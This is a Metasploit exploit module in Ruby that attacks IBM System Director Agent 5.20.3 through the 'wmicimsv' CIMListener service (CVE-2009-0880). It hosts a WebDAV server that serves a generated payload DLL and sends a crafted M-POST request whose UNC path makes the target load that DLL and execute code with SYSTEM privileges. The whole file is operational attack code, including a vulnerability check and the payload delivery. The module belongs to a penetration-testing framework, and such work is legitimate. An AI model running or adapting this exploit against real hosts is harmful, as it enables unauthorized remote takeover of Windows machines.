##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  def initialize
    super(
      'Name'          => 'IBM System Director Agent DLL Injection',
      'Description'   => %q{
          This module abuses the "wmicimsv" service on IBM System Director Agent 5.20.3
        to accomplish arbitrary DLL injection and execute arbitrary code with SYSTEM
        privileges.

        In order to accomplish remote DLL injection it uses a WebDAV service as disclosed
        by kingcope on December 2012. Because of this, the target host must have the
        WebClient service (WebDAV Mini-Redirector) enabled. It is enabled and automatically
        started by default on Windows XP SP3, but disabled by default on Windows 2003 SP2.
      },
      'Author'      => [
        'Bernhard Mueller', # Vulnerability discovery and exploit using directory traversal
        'kingcope', # Exploit using WebDAV
        'juan vazquez' # Metasploit module
      ],
      'Platform'    => 'win',
      'References'  =>
        [
          [ 'CVE', '2009-0880'],
          [ 'OSVDB', '52616'],
          [ 'OSVDB', '88102'],
          [ 'BID', '34065' ],
          [ 'URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20090305-2_IBM_director_privilege_escalation.txt' ],
          [ 'URL', 'http://seclists.org/bugtraq/2012/Dec/5' ]
        ],
      'Targets'     =>
        [
          [ 'IBM System Director Agent 5.20.3 / Windows with WebClient enabled', { } ]
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => true,
      'DisclosureDate' => 'Mar 10 2009'
    )
    register_options(
      [
        Opt::RPORT(6988),
        OptString.new('URIPATH',   [ true, "The URI to use (do not change)", "/" ]),
        OptPort.new('SRVPORT',     [ true, "The daemon port to listen on (do not change)", 80 ])
      ], self.class)
  end

  def auto_target(cli, request)
    agent = request.headers['User-Agent']

    ret = nil
    # Check for MSIE and/or WebDAV redirector requests
    if agent =~ /(Windows NT 5\.1|MiniRedir\/5\.1)/
      ret = targets[0]
    elsif agent =~ /(Windows NT 5\.2|MiniRedir\/5\.2)/
      ret = targets[0]
    else
      print_error("Unknown User-Agent: #{agent}")
    end

    ret
  end


  def on_request_uri(cli, request)

    mytarget = target
    if target.name == 'Automatic'
      mytarget = auto_target(cli, request)
      if (not mytarget)
        send_not_found(cli)
        return
      end
    end

    # If there is no subdirectory in the request, we need to redirect.
    if (request.uri == '/') or not (request.uri =~ /\/[^\/]+\//)
      if (request.uri == '/')
        subdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'
      else
        subdir = request.uri + '/'
      end
      print_status("Request for \"#{request.uri}\" does not contain a sub-directory, redirecting to #{subdir} ...")
      send_redirect(cli, subdir)
      return
    end

    # dispatch WebDAV requests based on method first
    case request.method
      when 'OPTIONS'
        process_options(cli, request, mytarget)

      when 'PROPFIND'
        process_propfind(cli, request, mytarget)

      when 'GET'
        process_get(cli, request, mytarget)

      when 'PUT'
        print_status("Sending 404 for PUT #{request.uri} ...")
        send_not_found(cli)

      else
        print_error("Unexpected request method encountered: #{request.method}")

    end

  end


  #
  # GET requests
  #
  def process_get(cli, request, target)

    print_status("Responding to GET request #{request.uri}")
    # dispatch based on extension
    if (request.uri =~ /\.dll$/i)
      print_status("Sending DLL")
      return if ((p = regenerate_payload(cli)) == nil)
      dll_payload = generate_payload_dll
      send_response(cli, dll_payload, { 'Content-Type' => 'application/octet-stream' })
    else
      send_not_found(cli)
    end
  end


  #
  # OPTIONS requests sent by the WebDav Mini-Redirector
  #
  def process_options(cli, request, target)
    print_status("Responding to WebDAV OPTIONS request")
    headers = {
      #'DASL'   => '<DAV:sql>',
      #'DAV'    => '1, 2',
      'Allow'  => 'OPTIONS, GET, PROPFIND',
      'Public' => 'OPTIONS, GET, PROPFIND'
    }
    send_response(cli, '', headers)
  end


  #
  # PROPFIND requests sent by the WebDav Mini-Redirector
  #
  def process_propfind(cli, request, target)
    path = request.uri
    print_status("Received WebDAV PROPFIND request")
    body = ''

    if (path =~ /\.dll$/i)
      print_status("Sending DLL multistatus for #{path} ...")
      body = %Q|<?xml version="1.0"?>
<a:multistatus xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/" xmlns:c="xml:" xmlns:a="DAV:">
<a:response>
</a:response>
</a:multistatus>
|
    elsif (path =~ /\.manifest$/i) or (path =~ /\.config$/i) or (path =~ /\.exe/i) or (path =~ /\.dll/i)
      print_status("Sending 404 for #{path} ...")
      send_not_found(cli)
      return

    elsif (path =~ /\/$/) or (not path.sub('/', '').index('/'))
      # Response for anything else (generally just /)
      print_status("Sending directory multistatus for #{path} ...")
      body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0001-1000-4808c3ec95000"</lp1:getetag>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|

    else
      print_status("Sending 404 for #{path} ...")
      send_not_found(cli)
      return

    end

    # send the response
    resp = create_response(207, "Multi-Status")
    resp.body = body
    resp['Content-Type'] = 'text/xml'
    cli.send_response(resp)
  end

  def xml_data
    xml = <<-eos
<?xml version="1.0" encoding="utf-8" ?>
<CIM CIMVERSION="2.0" DTDVERSION="2.0">
  <MESSAGE ID="1007" PROTOCOLVERSION="1.0">
    <SIMPLEEXPREQ>
      <EXPMETHODCALL NAME="ExportIndication">
        <EXPPARAMVALUE NAME="NewIndication">
          <INSTANCE CLASSNAME="CIM_AlertIndication" >
            <PROPERTY NAME="Description" TYPE="string">
              <VALUE>Sample CIM_AlertIndication indication</VALUE>
            </PROPERTY>
            <PROPERTY NAME="AlertType" TYPE="uint16">
              <VALUE>1</VALUE>
            </PROPERTY>
            <PROPERTY NAME="PerceivedSeverity" TYPE="uint16">
              <VALUE>3</VALUE>
            </PROPERTY>
            <PROPERTY NAME="ProbableCause" TYPE="uint16">
              <VALUE>2</VALUE>
            </PROPERTY>
            <PROPERTY NAME="IndicationTime" TYPE="datetime">
              <VALUE>20010515104354.000000:000</VALUE>
            </PROPERTY>
          </INSTANCE>
        </EXPPARAMVALUE>
      </EXPMETHODCALL>
    </SIMPLEEXPREQ>
  </MESSAGE>
</CIM>
    eos
    return xml
  end

  def check

    peer = "#{rhost}:#{rport}"
    print_status("#{peer} - Checking if CIMListener exists...")

    res = send_request_cgi({
      'uri'          => "/CIMListener/",
      'method'       => 'M-POST',
      'ctype'        => 'application/xml; charset=utf-8',
      'headers'     => {
        "Man"     => "http://www.dmtf.org/cim/mapping/http/v1.0 ; ns=40",
        "CIMOperation" => "MethodCall",
        "CIMExport" => "MethodRequest",
        "CIMExportMethod" => "ExportIndication"
      },
      'data'         => xml_data,
    }, 1)

    if res and res.code == 200 and res.body =~ /CIMVERSION/
      return CheckCode::Appears
    end
    return CheckCode::Safe
  end

  def exploit

    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'
      fail_with(Exploit::Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')
    end

    super

  end

  def primer

    basename = rand_text_alpha(3)
    share_name = rand_text_alpha(3)
    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
    exploit_unc  = "\\\\#{myhost}\\"

    vprint_status("Payload available at #{exploit_unc}#{share_name}\\#{basename}.dll")

    @peer = "#{rhost}:#{rport}"

    print_status("#{@peer} - Injecting DLL...")

    res = send_request_cgi({
      'uri'          => "/CIMListener/#{exploit_unc}#{share_name}\\#{basename}.dll",
      'method'       => 'M-POST',
      'ctype'        => 'application/xml; charset=utf-8',
      'headers'      => {
        "Man"             => "http://www.dmtf.org/cim/mapping/http/v1.0 ; ns=40",
        "CIMOperation"    => "MethodCall",
        "CIMExport"       => "MethodRequest",
        "CIMExportMethod" => "ExportIndication"
      },
      'data'         => xml_data,
    })

    if res and res.code == 200 and res.body =~ /CIMVERSION/
      print_status"#{@peer} - Then injection seemed to work..."
    else
      fail_with(Exploit::Failure::Unknown, "#{@peer} - Unexpected response")
    end
  end

end
